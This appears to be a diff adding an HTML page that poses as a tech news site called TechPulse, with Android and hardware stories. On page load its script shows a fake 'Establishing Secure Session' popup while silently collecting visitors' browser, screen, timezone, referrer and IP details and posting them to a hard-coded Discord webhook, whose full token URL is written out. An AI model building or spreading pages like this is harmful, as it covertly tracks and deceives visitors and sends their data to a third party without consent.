@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TechPulse | The Android & Hardware Authority</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&display=swap');
+        
+        body { 
+            background-color: #050505; 
+            color: #ffffff; 
+            font-family: 'Space Grotesk', sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .glass-nav {
+            background: rgba(5, 5, 5, 0.8);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .article-card {
+            background: #0d0d0d;
+            border: 1px solid #1a1a1a;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .article-card:hover {
+            border-color: #3b82f6;
+            transform: translateY(-2px);
+            background: #111111;
+        }
+
+        #infoPopup {
+            display: none;
+            position: fixed;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%; max-width: 420px;
+            background: #0f0f0f;
+            border: 1px solid #222;
+            border-radius: 20px;
+            z-index: 5000;
+            padding: 32px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+        }
+
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(10px);
+            z-index: 4500;
+        }
+
+        .loading-bar-container {
+            width: 100%;
+            height: 4px;
+            background: #1a1a1a;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 20px;
+        }
+
+        .loading-bar-fill {
+            width: 0%;
+            height: 100%;
+            background: #3b82f6;
+            transition: width 2s ease-in-out;
+        }
+
+        #articleView {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #050505;
+            z-index: 4000;
+            overflow-y: auto;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: #3b82f6;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 8px;
+            box-shadow: 0 0 10px #3b82f6;
+        }
+    </style>
+</head>
+<body>
+
+    <nav class="glass-nav fixed top-0 w-full z-50 px-6 py-4 flex justify-between items-center">
+        <div class="flex items-center gap-12">
+            <span class="text-2xl font-bold tracking-tighter text-white">TECH<span class="text-blue-600">PULSE</span></span>
+            <div class="hidden lg:flex gap-8 text-sm font-medium text-gray-400">
+                <a href="#" class="hover:text-white transition">Hardware</a>
+                <a href="#" class="hover:text-white transition">Mobile</a>
+                <a href="#" class="hover:text-white transition">Software</a>
+                <a href="#" class="hover:text-white transition">Security</a>
+            </div>
+        </div>
+        <div class="flex items-center gap-6">
+            <button class="bg-white text-black px-5 py-2 rounded-full text-sm font-bold hover:bg-gray-200 transition">Subscribe</button>
+        </div>
+    </nav>
+
+    <main class="pt-24 pb-20 px-6 max-w-7xl mx-auto">
+        <!-- Feature Story -->
+        <section class="mb-16 cursor-pointer" onclick="viewArticle('Android 16 Leak', 'The first dev builds of Android 16 (Baklava) are circulating. We noticed a new predictive back gesture and a unified storage controller that mimics desktop environments.', 'https://images.unsplash.com/photo-1607252820583-26245fed239d?auto=format&fit=crop&w=1200')">
+            <div class="relative rounded-3xl overflow-hidden h-[450px] border border-white/5">
+                <img src="https://images.unsplash.com/photo-1607252820583-26245fed239d?auto=format&fit=crop&w=1200" class="absolute inset-0 w-full h-full object-cover opacity-60">
+                <div class="absolute inset-0 bg-gradient-to-t from-black via-black/40 to-transparent"></div>
+                <div class="absolute bottom-0 p-10">
+                    <span class="bg-blue-600 text-[10px] font-bold px-3 py-1 rounded-full uppercase tracking-widest mb-4 inline-block">Breaking News</span>
+                    <h1 class="text-4xl md:text-5xl font-bold mb-4 leading-tight">Android 16: Everything we found in the early source code.</h1>
+                    <p class="text-gray-300 text-lg max-w-2xl font-light">From kernel upgrades to a new system-wide AI integration, Google is changing the game.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Secondary Feed -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+            <div class="article-card p-4 rounded-2xl group cursor-pointer" onclick="viewArticle('Chip Wars', 'TSMC 2nm production is ahead of schedule, leaving Intel and Samsung in the dust for 2026.', 'https://images.unsplash.com/photo-1591799264318-7e6ef8ddb7ea?auto=format&fit=crop&w=600')">
+                <img src="https://images.unsplash.com/photo-1591799264318-7e6ef8ddb7ea?auto=format&fit=crop&w=600" class="w-full h-44 object-cover rounded-xl mb-4">
+                <h3 class="text-lg font-bold group-hover:text-blue-400 transition">The 2nm race is over before it even started.</h3>
+            </div>
+            <div class="article-card p-4 rounded-2xl group cursor-pointer" onclick="viewArticle('KernelSU News', 'A new patch for KernelSU allows for seamless Play Integrity bypass without custom TEE hooks.', 'https://images.unsplash.com/photo-1555680202-c86f0e12f086?auto=format&fit=crop&w=600')">
+                <img src="https://images.unsplash.com/photo-1555680202-c86f0e12f086?auto=format&fit=crop&w=600" class="w-full h-44 object-cover rounded-xl mb-4">
+                <h3 class="text-lg font-bold group-hover:text-blue-400 transition">KernelSU just made rooting significantly easier.</h3>
+            </div>
+            <div class="article-card p-4 rounded-2xl group cursor-pointer" onclick="viewArticle('Privacy Leak', 'Over 200 million records leaked from a major cloud provider. Check if your device is at risk.', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=600')">
+                <img src="https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=600" class="w-full h-44 object-cover rounded-xl mb-4">
+                <h3 class="text-lg font-bold group-hover:text-blue-400 transition">Massive data leak targets Android cloud backups.</h3>
+            </div>
+        </div>
+    </main>
+
+    <div id="articleView">
+        <div class="max-w-4xl mx-auto px-6 pt-32 pb-20">
+            <button onclick="closeArticle()" class="mb-12 text-blue-500 font-bold flex items-center gap-2">← BACK TO FEED</button>
+            <img id="vImg" src="" class="w-full h-[350px] object-cover rounded-2xl mb-12 border border-white/10">
+            <h1 id="vTitle" class="text-5xl font-bold mb-8"></h1>
+            <div id="vBody" class="text-gray-400 text-xl leading-relaxed space-y-8"></div>
+        </div>
+    </div>
+
+    <!-- CLEAN POPUP - NO RAW CODE -->
+    <div id="overlay"></div>
+    <div id="infoPopup">
+        <div class="mb-6">
+            <h2 class="text-xl font-bold text-white mb-2">Establishing Secure Session</h2>
+            <p class="text-gray-500 text-xs">Authenticating device with regional nodes...</p>
+        </div>
+        
+        <div class="space-y-3 py-2">
+            <div class="flex items-center text-xs text-gray-400">
+                <span class="status-dot"></span> Verifying encryption keys...
+            </div>
+            <div class="flex items-center text-xs text-gray-400">
+                <span id="status2" class="status-dot bg-gray-600 shadow-none"></span> Synchronizing local cache...
+            </div>
+            <div class="flex items-center text-xs text-gray-400">
+                <span id="status3" class="status-dot bg-gray-600 shadow-none"></span> Finalizing security handshake...
+            </div>
+        </div>
+
+        <div class="loading-bar-container">
+            <div id="loadBar" class="loading-bar-fill"></div>
+        </div>
+
+        <button id="acceptBtn" disabled onclick="closePopup()" class="w-full mt-8 bg-blue-600 text-white font-bold py-4 rounded-xl opacity-50 cursor-not-allowed transition-all">INITIALIZING...</button>
+    </div>
+
+    <script>
+        function viewArticle(t, b, i) {
+            document.getElementById('vTitle').innerText = t;
+            document.getElementById('vBody').innerText = b;
+            document.getElementById('vImg').src = i;
+            document.getElementById('articleView').style.display = 'block';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeArticle() {
+            document.getElementById('articleView').style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        async function runSilentHandshake() {
+            // Show the UI
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('infoPopup').style.display = 'block';
+
+            // Start visual loading
+            setTimeout(() => {
+                document.getElementById('loadBar').style.width = '100%';
+                document.getElementById('status2').classList.replace('bg-gray-600', 'bg-blue-600');
+                document.getElementById('status2').classList.add('shadow-[0_0_10px_#3b82f6]');
+            }, 500);
+
+            // Deep Data Collection (Silent)
+            const data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                onLine: navigator.onLine,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight
+                },
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                referrer: document.referrer,
+                currentUrl: window.location.href,
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'N/A'
+            };
+
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                data.ipAddress = ipData.ip;
+            } catch (e) { data.ipAddress = "Hidden/Proxy"; }
+
+            // Webhook sending
+            const webhook = 'https://discord.com/api/webhooks/1471861384265596990/-sgfcOah12Zw7rkxED9k7S_2NpSQMzsDkZcEhkiXrOfQF479IuVInLSnlSpOg4dlq7MC';
+            
+            fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "TechPulse System",
+                    content: "📥 **Incoming Node Connection**",
+                    embeds: [{
+                        title: "Deep Telemetry Log",
+                        description: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
+                        color: 3447003
+                    }]
+                })
+            });
+
+            // Finish UI
+            setTimeout(() => {
+                document.getElementById('status3').classList.replace('bg-gray-600', 'bg-blue-600');
+                document.getElementById('status3').classList.add('shadow-[0_0_10px_#3b82f6]');
+                const btn = document.getElementById('acceptBtn');
+                btn.innerText = "ACCESS ENCRYPTED FEED";
+                btn.classList.remove('opacity-50', 'cursor-not-allowed');
+                btn.disabled = false;
+            }, 2000);
+        }
+
+        function closePopup() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('infoPopup').style.display = 'none';
+        }
+
+        window.onload = runSilentHandshake;
+    </script>
+</body>
+</html>
+
